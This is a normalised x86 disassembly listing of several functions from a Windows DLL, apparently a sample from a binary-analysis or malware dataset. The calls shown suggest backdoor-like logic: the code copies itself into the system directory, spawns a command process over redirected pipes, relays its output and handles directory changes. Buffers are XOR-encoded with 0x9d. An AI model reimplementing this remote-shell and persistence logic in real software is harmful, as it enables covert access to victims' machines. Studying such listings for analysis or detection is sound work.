mov [ esp + 0x40 ] bl
cmp [ esp + 0x8c ] esi
jb r-xdata
mov ecx [ esp + 0x40 ]
push ecx
call sub_1000c4b4
add esp 0x4
mov edx [ esp + 0x78 ]
sub_100061a0
push 0xffffffff
push sub_1001e42d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7ac
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x7a8 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x7c0 ]
mov [ fs : 0x0 ] eax
mov eax [ esp + 0x7d0 ]
mov ebp [ esp + 0x7d4 ]
xor ebx ebx
push 0xff
mov edi ecx
lea ecx [ esp + 0x2c1 ]
push ebx
push ecx
mov [ esp + 0x20 ] eax
mov [ esp + 0x2c8 ] bl
call sub_1000fe10
add esp 0xc
push 0xff
lea edx [ esp + 0x1c1 ]
push ebx
push edx
mov [ esp + 0x1c8 ] bl
call sub_1000fe10
xor eax eax
mov [ esp + 0xb9 ] eax
mov [ esp + 0xbd ] eax
mov [ esp + 0xc1 ] eax
mov [ esp + 0xc5 ] ax
mov [ esp + 0xc7 ] al
add esp 0xc
lea eax [ esp + 0x1bc ]
push eax
mov edx r--data
mov ecx edi
mov [ esp + 0xb0 ] bl
call sub_1000b4e0
lea ecx [ esp + 0x2bc ]
push ecx
mov edx r--data
mov ecx edi
call sub_1000b4e0
lea edx [ esp + 0xac ]
push edx
mov edx r--data
mov ecx edi
call sub_1000b4e0
lea eax [ esp + 0xac ]
push eax
call sub_1000d5f3
add esp 0x4
lea ecx [ esp + 0x1bc ]
mov esi eax
push r--data
push ecx
mov [ esp + 0x20 ] esi
call sub_1000c1e0
mov edi eax
add esp 0x8
cmp edi ebx
jne r-xdata
push 0x2
push ebx
push edi
call sub_1000c96a
add esp 0xc
push edi
call sub_1000c872
add esp 0x4
push edi
mov [ esp + 0x20 ] eax
call sub_1000ca66
add esp 0x4
cmp [ esp + 0x1c ] esi
jae r-xdata
mov ebp 0xf
mov [ esp + 0xa8 ] ebp
mov [ esp + 0xa4 ] ebx
mov [ esp + 0x94 ] bl
mov [ esp + 0x7c8 ] ebx
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
push 0x1c
push r--data
lea ecx [ esp + 0x44 ]
mov [ esp + 0x7d0 ] 0x1
call sub_10009630
push 0xff
lea edx [ esp + 0xc1 ]
push ebx
push edx
mov [ esp + 0xc8 ] bl
call sub_1000fe10
mov edi [ esp + 0x4c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x54 ] esi
jae r-xdata
push ebx
push r--data
lea ecx [ esp + 0x7c ]
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] bl
call sub_10009630
lea ebx [ esp + 0x2bc ]
mov edi r--data
lea esi [ esp + 0x74 ]
mov [ esp + 0x7c8 ] 0x4
call sub_10004540
lea ebx [ esp + 0x1bc ]
mov edi r--data
call sub_10004540
xor ebx ebx
push 0x3ff
lea edx [ esp + 0x3c1 ]
push ebx
push edx
mov [ esp + 0x3c8 ] bl
call sub_1000fe10
mov eax [ ebp + 0x34 ]
mov ecx [ eax + 0x4 ]
lea esi [ ebp + 0x1c ]
add esp 0xc
push ecx
mov ecx esi
call sub_10009190
mov eax [ esi + 0x18 ]
mov [ eax + 0x4 ] eax
mov eax [ esi + 0x18 ]
mov [ esi + 0x1c ] ebx
mov [ eax ] eax
mov esi [ esi + 0x18 ]
push ebx
push r--data
mov ecx ebp
mov [ esi + 0x8 ] esi
call sub_10009630
cmp [ esp + 0x8c ] 0x10
mov edi [ esp + 0x78 ]
jae r-xdata
mov ebp 0xf
mov [ esp + 0xa8 ] ebp
mov [ esp + 0xa4 ] ebx
mov [ esp + 0x94 ] bl
mov [ esp + 0x7c8 ] 0x2
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
push 0x26
push r--data
lea ecx [ esp + 0x44 ]
mov [ esp + 0x7d0 ] 0x3
call sub_10009630
push 0xff
lea edx [ esp + 0xc1 ]
push ebx
push edx
mov [ esp + 0xc8 ] bl
call sub_1000fe10
mov edi [ esp + 0x4c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x54 ] esi
jae r-xdata
lea eax [ esp + 0xbc ]
push eax
call sub_1000b7b0
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0xbc ]
push ecx
push edx
call sub_10004680
mov [ esp + 0x7d0 ] bl
lea edi [ esp + 0x40 ]
lea edx [ esp + 0x3bc ]
push edx
call sub_1000b7b0
push ebp
lea edi [ esp + 0x3c0 ]
mov ecx r--data
call sub_1000aad0
push ebp
mov edi r--data
mov ecx r--data
call sub_1000aad0
mov ebx ebp
call sub_1000ad00
xor eax eax
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] eax
mov [ esp + 0x5c ] al
push r--data
mov ebx r--data
mov edi r--data
lea esi [ esp + 0x24 ]
mov [ esp + 0x7cc ] 0x5
call sub_10004ad0
add esp 0x4
push 0xffffffff
xor ebx ebx
push ebx
push eax
lea ecx [ esp + 0x64 ]
mov [ esp + 0x7d4 ] 0x6
call sub_10008f60
mov esi 0x10
mov [ esp + 0x7c8 ] 0x5
cmp [ esp + 0x38 ] esi
jb r-xdata
lea edi [ esp + 0x78 ]
lea eax [ esp + 0xbc ]
push eax
call sub_1000b7b0
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0xbc ]
push ecx
push edx
call sub_10004680
mov [ esp + 0x7d0 ] 0x2
jmp r-xdata
lea edi [ esp + 0x40 ]
mov [ esp + 0x7c8 ] 0xffffffff
mov [ esp + 0x54 ] ebp
mov [ esp + 0x50 ] ebx
mov [ esp + 0x40 ] bl
cmp [ esp + 0xa8 ] esi
jb r-xdata
mov eax [ esp + 0x40 ]
push eax
call sub_1000c4b4
add esp 0x4
mov eax [ esp + 0x5c ]
mov [ esp + 0x38 ] 0xf
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] bl
cmp [ esp + 0x70 ] esi
jae r-xdata
mov eax [ esp + 0x24 ]
push eax
call sub_1000c4b4
add esp 0x4
add esp 0x8
cmp [ esp + 0x54 ] esi
jb r-xdata
mov eax 0x1
mov ecx [ esp + 0x7c0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x7a8 ]
xor ecx esp
call sub_1000c0a5
add esp 0x7b8
retn
mov ecx [ esp + 0x94 ]
jmp r-xdata
mov esi [ esp + 0x14 ]
mov ebx r--data
call sub_1000bc40
mov ebx r--data
mov edi r--data
call sub_1000bd50
cmp [ ebp + 0x18 ] 0x10
jb r-xdata
lea eax [ esp + 0x5c ]
push ecx
call sub_1000c4b4
add esp 0x4
lea ebx [ ebp + 0x4 ]
mov ebx [ ebp + 0x4 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea ecx [ esp + 0x1c0 ]
push ecx
push edi
call sub_100109a0
mov edx [ esp + 0x24 ]
mov [ esi + 0x14208 ] edx
mov esi 0x10
add esp 0xc
mov [ esp + 0x7c8 ] 0x4
cmp [ esp + 0x70 ] esi
jb r-xdata
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
push 0x200
xor ebx ebx
lea edi [ esi + 0x14008 ]
push ebx
push edi
mov [ esi + 0x1420c ] 0x9
call sub_1000fe10
lea eax [ esp + 0x1c8 ]
add esp 0xc
lea edx [ eax + 0x1 ]
mov [ esp + 0x7c8 ] 0xffffffff
mov [ esp + 0x70 ] 0xf
mov [ esp + 0x6c ] ebx
mov [ esp + 0x5c ] bl
cmp [ esp + 0x8c ] esi
jb r-xdata
mov eax [ esp + 0x5c ]
push eax
call sub_1000c4b4
add esp 0x4
mov ecx [ esp + 0x78 ]
sub_10006740
push 0xffffffff
push sub_1001e3b1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x4b8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x4b0 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x4cc ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x4dc ]
xor ebx ebx
push 0x103
lea eax [ esp + 0xb9 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0xc0 ] bl
call sub_1000fe10
add esp 0xc
lea ecx [ esp + 0xb4 ]
push ecx
mov edx r--data
mov ecx esi
call sub_1000b4e0
lea eax [ esp + 0xb4 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push 0x104
lea ecx [ esp + 0xb8 ]
push ecx
call [ GetSystemDirectoryA@IAT ]
lea eax [ esp + 0xb4 ]
dec eax
push 0x103
lea edx [ esp + 0x2c1 ]
push ebx
push edx
mov [ esp + 0x2c8 ] bl
call sub_1000fe10
mov esi [ GetSystemDirectoryA@IAT ]
add esp 0xc
push 0x104
lea eax [ esp + 0x2c0 ]
push eax
call esi
lea eax [ esp + 0x2bc ]
dec eax
lea ebx [ ebx ]
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ eax ] edx
mov dl [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] dl
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
mov cl [ r--data ]
mov [ eax + 0x4 ] edx
push 0x3
lea edx [ esp + 0xb8 ]
push r--data
push edx
mov [ eax + 0x8 ] cl
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
mov [ esp + 0xb0 ] 0xf
mov [ esp + 0xac ] ebx
mov [ esp + 0x9c ] bl
push 0x1a
push r--data
lea ecx [ esp + 0xa0 ]
mov [ esp + 0x4dc ] 0x2
call sub_10009630
push 0xff
lea edx [ esp + 0x3c9 ]
push ebx
push edx
mov [ esp + 0x3d0 ] bl
call sub_1000fe10
mov edi [ esp + 0xa8 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0xb0 ] esi
jae r-xdata
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x6c ]
push ecx
mov [ rw-data ] eax
call [ CloseHandle@IAT ]
push 0x64
call [ Sleep@IAT ]
mov ecx ebp
call sub_10008120
jmp r-xdata
push ebx
lea edx [ esp + 0xb8 ]
push edx
lea eax [ esp + 0x2c4 ]
push eax
call [ CopyFileA@IAT ]
test eax eax
jne r-xdata
push 0x104
lea eax [ esp + 0xb8 ]
push ebx
push eax
call sub_1000fe10
add esp 0xc
push 0x104
lea ecx [ esp + 0xb8 ]
push ecx
call esi
lea eax [ esp + 0xb4 ]
dec eax
lea ebx [ ebx ]
lea eax [ esp + 0x3c4 ]
push eax
call sub_1000b7b0
lea ecx [ esp + 0x3c4 ]
push ecx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x4d4 ] 0xffffffff
cmp [ esp + 0xb0 ] esi
jb r-xdata
lea edi [ esp + 0x9c ]
mov ecx [ esp + 0x4cc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x4b0 ]
xor ecx esp
call sub_1000c0a5
add esp 0x4c4
retn
lea edx [ esp + 0xb4 ]
push r--data
push edx
call sub_1000c1e0
add esp 0x8
cmp eax ebx
je r-xdata
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] bl
push 0x21
push r--data
lea ecx [ esp + 0x84 ]
mov [ esp + 0x4dc ] ebx
call sub_10009630
call [ GetLastError@IAT ]
mov bl al
lea esi [ esp + 0x7c ]
call sub_10008ed0
push 0xff
lea ecx [ esp + 0x1c1 ]
push 0x0
push ecx
mov [ esp + 0x1c8 ] 0x0
call sub_1000fe10
mov edi [ esp + 0x8c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x94 ] esi
jae r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ eax ] edx
mov dx [ r--data ]
mov [ eax + 0x4 ] ecx
mov cl [ r--data ]
mov [ eax + 0x8 ] dx
mov [ eax + 0xa ] cl
mov eax 0x1
mov edx [ esp + 0x9c ]
push edx
mov [ esp + 0x94 ] 0xf
mov [ esp + 0x90 ] ebx
mov [ esp + 0x80 ] bl
push 0x22
push r--data
lea ecx [ esp + 0x84 ]
mov [ esp + 0x4dc ] 0x1
call sub_10009630
push 0xff
lea eax [ esp + 0x1c1 ]
push ebx
push eax
mov [ esp + 0x1c8 ] bl
call sub_1000fe10
mov edi [ esp + 0x8c ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x94 ] esi
jae r-xdata
push eax
call sub_10008980
add esp 0x4
cmp eax ebx
jne r-xdata
lea edx [ esp + 0x1bc ]
push edx
call sub_1000b7b0
lea eax [ esp + 0x1bc ]
push eax
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x4d4 ] 0xffffffff
cmp [ esp + 0x94 ] esi
jb r-xdata
lea edi [ esp + 0x80 ]
lea ecx [ esp + 0x1bc ]
push ecx
call sub_1000b7b0
lea edx [ esp + 0x1bc ]
push edx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x4d4 ] 0xffffffff
cmp [ esp + 0x94 ] esi
jb r-xdata
lea edi [ esp + 0x80 ]
mov [ esp + 0x14 ] 0xc
mov [ esp + 0x18 ] ebx
mov [ esp + 0x1c ] 0x1
call sub_10004b90
mov esi [ CreatePipe@IAT ]
push ebx
lea eax [ esp + 0x18 ]
push eax
push rw-data
push rw-data
call esi
push ebx
lea ecx [ esp + 0x18 ]
push ecx
push rw-data
push rw-data
call esi
lea edx [ esp + 0x24 ]
push edx
call [ GetStartupInfoA@IAT ]
mov edx [ rw-data ]
xor eax eax
mov [ esp + 0x54 ] ax
mov eax [ rw-data ]
xor ecx ecx
mov [ esp + 0x60 ] eax
mov [ esp + 0x64 ] eax
lea eax [ esp + 0x6c ]
push eax
mov [ esp + 0x5a ] cx
lea ecx [ esp + 0x28 ]
push ecx
push ebx
push ebx
push ebx
push 0x1
push ebx
mov [ esp + 0x78 ] edx
push ebx
lea edx [ esp + 0xd4 ]
push edx
push ebx
mov [ esp + 0x4c ] 0x44
mov [ esp + 0x50 ] ebx
mov [ esp + 0x58 ] ebx
mov [ esp + 0x54 ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x80 ] ebx
mov [ esp + 0x78 ] 0x101
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov ecx [ esp + 0x80 ]
push ecx
jmp r-xdata
mov eax [ esp + 0x80 ]
push eax
jmp r-xdata
call sub_1000c4b4
add esp 0x4
sub_10006c80
push 0xffffffff
push sub_1001e35b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x924
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x920 ] eax
push ebx
push ebp
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x938 ]
mov [ fs : 0x0 ] eax
mov ebp [ esp + 0x948 ]
xor ebx ebx
push 0x7ff
lea eax [ esp + 0x139 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x140 ] bl
call sub_1000fe10
mov ecx [ rw-data ]
add esp 0xc
push ebx
push ecx
mov [ esp + 0x1c ] ebx
call [ WaitForSingleObject@IAT ]
test eax eax
jne r-xdata
lea eax [ esp + 0x134 ]
push eax
mov edx r--data
mov ecx esi
call sub_1000b4e0
lea eax [ esp + 0x134 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov [ esp + 0x30 ] 0xf
mov [ esp + 0x2c ] ebx
mov [ esp + 0x1c ] bl
push 0x1e
push r--data
lea ecx [ esp + 0x20 ]
mov [ esp + 0x948 ] ebx
call sub_10009630
push 0xff
lea edx [ esp + 0x39 ]
push ebx
push edx
mov [ esp + 0x40 ] bl
call sub_1000fe10
mov edi [ esp + 0x28 ]
mov esi 0x10
add esp 0xc
cmp [ esp + 0x30 ] esi
jae r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea eax [ esp + 0x34 ]
push eax
call sub_1000b7b0
lea ecx [ esp + 0x34 ]
push ecx
push ebp
call sub_10004680
add esp 0x8
mov [ esp + 0x940 ] 0xffffffff
cmp [ esp + 0x30 ] esi
jb r-xdata
lea edi [ esp + 0x1c ]
push ebx
sub eax edx
lea ecx [ esp + 0x18 ]
push ecx
push eax
mov eax [ rw-data ]
lea edx [ esp + 0x140 ]
push edx
push eax
call [ WriteFile@IAT ]
lea ecx [ esp + 0x134 ]
mov eax r--data
mov eax 0x1
mov ecx [ esp + 0x938 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebp
pop ebx
mov ecx [ esp + 0x920 ]
xor ecx esp
call sub_1000c0a5
add esp 0x930
retn
mov edx [ esp + 0x1c ]
push edx
call sub_1000c4b4
add esp 0x4
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp dl bl
je r-xdata
push 0x1f4
call [ Sleep@IAT ]
mov ecx ebp
call sub_10008120
push 0x3e8
call [ Sleep@IAT ]
call sub_10004b90
push ebx
push ebp
call sub_10004680
add esp 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
cmp dl [ ecx + 0x1 ]
jne r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add ecx 0x2
cmp dl bl
jne r-xdata
mov dl [ eax ]
cmp dl [ ecx ]
jne r-xdata
sub_10006e70
sub esp 0x20
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
push ebx
push ebp
mov ebp [ esp + 0x2c ]
push esi
push edi
push 0x14000
lea eax [ ebp + 0x4 ]
push 0x0
push eax
mov [ ebp + 0x14004 ] 0x0
call sub_1000fe10
push r--data
mov ebx r--data
mov edi r--data
lea esi [ esp + 0x20 ]
call sub_10004ad0
mov eax [ esp + 0x24 ]
add esp 0x10
cmp [ esp + 0x28 ] 0x10
jae r-xdata
mov ebx r--data
mov esi ebp
call sub_1000bc40
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
lea edi [ ebp + 0x4 ]
push edi
push 0x14000
call [ GetCurrentDirectoryA@IAT ]
dec edi
lea eax [ esp + 0x14 ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ax [ r--data ]
mov [ edi ] ax
lea eax [ ebp + 0x4 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0x14004 ] eax
je r-xdata
cmp [ esp + 0x28 ] 0x10
pop edi
pop esi
mov [ ebp + 0x1420c ] 0x8
pop ebp
pop ebx
jb r-xdata
mov ecx 0xfffffffc
lea eax [ ebp + 0x4 ]
sub ecx ebp
mov ecx [ esp + 0x1c ]
xor ecx esp
mov eax 0x1
call sub_1000c0a5
add esp 0x20
retn
mov eax [ esp + 0x4 ]
push eax
call sub_1000c4b4
add esp 0x4
xor [ eax ] 0x9d
inc eax
lea edx [ ecx + eax ]
cmp edx [ ebp + 0x14004 ]
jb r-xdata
sub_10006fb0
sub esp 0xdd8
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0xdd4 ] eax
push ebx
push ebp
mov ebp [ esp + 0xde4 ]
push esi
push edi
xor ebx ebx
push 0x3ff
lea eax [ esp + 0x1e5 ]
push ebx
push eax
mov esi ecx
mov [ esp + 0x1ec ] bl
call sub_1000fe10
push 0x12b
lea ecx [ esp + 0xc1 ]
push ebx
push ecx
mov [ esp + 0xc8 ] bl
call sub_1000fe10
push 0x14000
lea eax [ ebp + 0x4 ]
push ebx
push eax
mov [ ebp + 0x14004 ] ebx
call sub_1000fe10
add esp 0x24
lea edx [ esp + 0x1e0 ]
push edx
mov edx r--data
mov ecx esi
call sub_1000b4e0
movsx eax [ esp + 0x1e0 ]
push eax
call sub_1000d972
add esp 0x4
test eax eax
je r-xdata
push 0x2
lea edx [ esp + 0x1e4 ]
push r--data
push edx
call sub_1000d320
add esp 0xc
test eax eax
jne r-xdata
cmp [ esp + 0x1e1 ] 0x3a
jne r-xdata
push 0x44
lea edx [ esp + 0x4c ]
push ebx
push edx
call sub_1000fe10
mov esi [ CreatePipe@IAT ]
xor eax eax
add esp 0xc
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] eax
push ebx
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
mov [ esp + 0x44 ] eax
mov [ esp + 0x48 ] eax
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x3c ]
push ecx
lea edx [ esp + 0x2c ]
push edx
mov [ esp + 0x38 ] 0xc
mov [ esp + 0x3c ] ebx
mov [ esp + 0x40 ] 0x1
call esi
push ebx
lea eax [ esp + 0x2c ]
push eax
lea ecx [ esp + 0x2c ]
push ecx
lea edx [ esp + 0x24 ]
push edx
call esi
lea eax [ esp + 0x48 ]
push eax
call [ GetStartupInfoA@IAT ]
mov eax [ esp + 0x20 ]
xor ecx ecx
push 0x7ff
mov [ esp + 0x7c ] cx
mov [ esp + 0x84 ] eax
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x5e5 ]
xor edx edx
push ebx
push ecx
mov [ esp + 0x54 ] 0x44
mov [ esp + 0x58 ] ebx
mov [ esp + 0x60 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x70 ] ebx
mov [ esp + 0x6c ] ebx
mov [ esp + 0x68 ] ebx
mov [ esp + 0x64 ] ebx
mov [ esp + 0x88 ] ebx
mov [ esp + 0x86 ] dx
mov [ esp + 0x80 ] 0x101
mov [ esp + 0x90 ] eax
mov [ esp + 0x94 ] eax
mov [ esp + 0x5ec ] bl
call sub_1000fe10
lea eax [ esp + 0x5ec ]
add esp 0xc
dec eax
mov edi edi
lea eax [ esp + 0x1e0 ]
lea edx [ eax + 0x1 ]
mov edi edi
lea ecx [ esp + 0x1e0 ]
push ecx
call [ SetCurrentDirectoryA@IAT ]
jmp r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov edx [ r--data ]
mov ecx [ r--data ]
mov [ eax ] edx
mov edx [ r--data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] edx
lea eax [ esp + 0x1e0 ]
mov edx eax
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp eax 0x2
jbe r-xdata
lea edx [ esp + 0xb0 ]
push edx
push 0x12c
call [ GetCurrentDirectoryA@IAT ]
lea edi [ esp + 0xb0 ]
dec edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov al [ esp + 0x1e2 ]
cmp al 0x2e
je r-xdata
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov ax [ r--data ]
mov [ edi ] ax
lea eax [ esp + 0xb0 ]
lea edx [ eax + 0x1 ]
lea esp [ esp ]
lea edi [ esp + 0x5e0 ]
sub eax edx
dec edi
lea ecx [ esp + 0x1e2 ]
push ecx
call [ SetCurrentDirectoryA@IAT ]
jmp r-xdata
cmp al 0x5c
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edx [ ebp + 0x14004 ]
push eax
lea ecx [ esp + 0xb4 ]
push ecx
lea eax [ edx + ebp + 0x4 ]
push eax
call sub_100109a0
lea eax [ esp + 0xbc ]
add esp 0xc
lea edx [ eax + 0x1 ]
nop
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea eax [ esp + 0x38 ]
push eax
[ edi ] [ esi ]
lea ecx [ esp + 0x4c ]
push ecx
push ebx
push ebx
push 0x10
push 0x1
push ebx
push ebx
lea edx [ esp + 0x600 ]
push edx
push ebx
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
cmp al 0x9
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
add [ ebp + 0x14004 ] eax
push r--data
mov ebx r--data
mov edi r--data
lea esi [ esp + 0x98 ]
call sub_10004ad0
mov eax [ esp + 0x9c ]
add esp 0x4
cmp [ esp + 0xac ] 0x10
jae r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ CloseHandle@IAT ]
push ecx
call esi
mov edx [ esp + 0x34 ]
push edx
call esi
mov eax [ esp + 0x18 ]
push eax
call esi
mov ecx [ esp + 0x24 ]
push ecx
call esi
mov eax [ esp + 0x38 ]
push 0x7530
push eax
call [ WaitForSingleObject@IAT ]
cmp eax 0x102
jne r-xdata
lea eax [ esp + 0x1e0 ]
mov esi 0x2
lea edx [ eax + 0x1 ]
cmp al 0x20
jne r-xdata
mov ebx r--data
mov esi ebp
call sub_1000bc40
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
mov ebx r--data
mov edi r--data
call sub_1000bd50
lea eax [ ebp + 0x4 ]
lea edx [ eax + 0x1 ]
lea eax [ esp + 0x98 ]
mov eax [ esp + 0x18 ]
push ebx
lea edx [ esp + 0x18 ]
push edx
push ebx
push ebx
push ebx
push eax
mov [ esp + 0x2c ] ebx
call [ PeekNamedPipe@IAT ]
cmp [ esp + 0x14 ] ebx
jbe r-xdata
mov ecx [ esp + 0x38 ]
push ebx
push ecx
call [ TerminateProcess@IAT ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp eax 0x2
jbe r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
mov [ ebp + 0x14004 ] eax
je r-xdata
push 0x14000
push ebx
lea edi [ ebp + 0x4 ]
push edi
mov [ ebp + 0x14004 ] ebx
call sub_1000fe10
add esp 0xc
mov [ esp + 0x1c ] ebx
xor esi esi
lea eax [ esp + 0x1e0 ]
lea edx [ eax + 0x1 ]
mov al [ esp + esi + 0x1e0 ]
cmp al 0x9
je r-xdata
cmp [ esp + 0xac ] 0x10
mov [ ebp + 0x1420c ] 0x8
jb r-xdata
mov ecx 0xfffffffc
lea eax [ ebp + 0x4 ]
sub ecx ebp
lea ecx [ ecx ]
mov [ esi + ebp + 0x4 ] 0xa
inc esi
mov [ ebp + 0x14004 ] esi
push ebx
lea ecx [ esp + 0x20 ]
push ecx
mov ecx [ esp + 0x20 ]
mov edx 0x13efc
sub edx esi
push edx
lea eax [ esi + edi ]
push eax
push ecx
call [ ReadFile@IAT ]
mov eax [ esp + 0x18 ]
add esi [ esp + 0x1c ]
push ebx
lea edx [ esp + 0x18 ]
push edx
push ebx
push ebx
push ebx
push eax
mov [ esp + 0x2c ] ebx
call [ PeekNamedPipe@IAT ]
cmp esi 0x13f00
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp esi eax
jae r-xdata
lea eax [ esp + 0x1e0 ]
inc esi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp al 0x20
jne r-xdata
mov ecx [ esp + 0xde4 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
mov eax 0x1
call sub_1000c0a5
add esp 0xdd8
retn
mov eax [ esp + 0x98 ]
push eax
call sub_1000c4b4
add esp 0x4
xor [ eax ] 0x9d
inc eax
lea edx [ ecx + eax ]
cmp edx [ ebp + 0x14004 ]
jb r-xdata
cmp [ esp + 0x14 ] ebx
jbe r-xdata
lea eax [ esp + esi + 0x1e0 ]
push eax
call [ SetCurrentDirectoryA@IAT ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp esi eax
jb r-xdata
sub_10007530
sub esp 0x24
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1c ] eax
xor eax eax
mov [ esp + 0x8 ] al
mov [ esp + 0x9 ] eax
mov [ esp + 0xd ] eax
mov [ esp + 0x11 ] eax
mov [ esp + 0x15 ] ax
mov [ esp + 0x17 ] al
lea eax [ esp + 0x8 ]
push eax
mov edx r--data
call sub_1000b4e0
lea ecx [ esp + 0x8 ]
push ecx
call sub_1000dede
fld [ r--data ]
fnstcw [ esp + 0xa ]
add esp 0x4
movzx eax [ esp + 0x6 ]
fmul st1
or eax 0xc00
mov [ esp + 0x8 ] eax
mov [ rw-data ] 0x13
fmulp st1
xor eax eax
fldcw [ esp + 0x8 ]
fistp [ esp + 0x8 ]
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x1c ]
xor ecx esp
mov [ rw-data ] edx
fldcw [ esp + 0x6 ]
call sub_1000c0a5
add esp 0x24
retn
sub_100075d0
push 0xffffffff
push sub_1001e31b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x120
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x11c ] eax
push ebx
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x12c ]
